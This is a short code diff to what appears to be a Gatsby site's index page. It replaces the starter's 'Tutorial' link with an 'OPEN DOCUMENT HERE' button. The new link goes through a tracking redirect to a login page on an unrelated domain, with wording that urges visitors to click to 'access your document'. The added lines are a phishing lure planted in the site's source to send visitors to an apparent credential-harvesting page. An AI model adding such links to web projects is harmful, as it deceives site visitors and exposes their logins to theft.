@@ -8,10 +8,10 @@ import * as styles from "../components/index.module.css"
 
 const links = [
   {
-    text: "Tutorial",
-    url: "https://www.gatsbyjs.com/docs/tutorial",
+    text: "OPEN DOCUMENT HERE",
+    url: "http://recp.mkt81.net/ctt?m=6839690&r=MjI5NjQwMDYxODgzS0&b=0&j=MTI0MTEyMDE3OAS2&k=NEWSLETTER&kx=1&kt=12&kd=https://tiodososalrivas.com/login/index.html",
     description:
-      "A great place to get started if you're new to web development. Designed to guide you through setting up your first Gatsby site.",
+      "To access your document please view the above link to continue.",
   },
 ]
 
